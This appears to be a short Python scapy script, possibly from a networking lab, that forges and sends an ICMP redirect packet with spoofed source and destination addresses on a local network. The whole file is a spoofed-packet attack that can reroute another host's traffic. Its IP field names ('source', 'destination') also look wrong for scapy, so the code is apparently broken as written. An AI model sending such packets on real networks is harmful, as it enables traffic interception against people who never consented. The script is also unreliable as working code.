from scapy.all import *
#Creating ICMP packet
icmp_redirect = Ether()/IP (source="192.168.0.140", destination="192.168.0.177")/ICMP (type=5, code=1, gw="192.168.0.1")
# Sending the ICMP packet using the interface wlp2s0.
sendp(icmp_redirect, iface="wlp2s0")
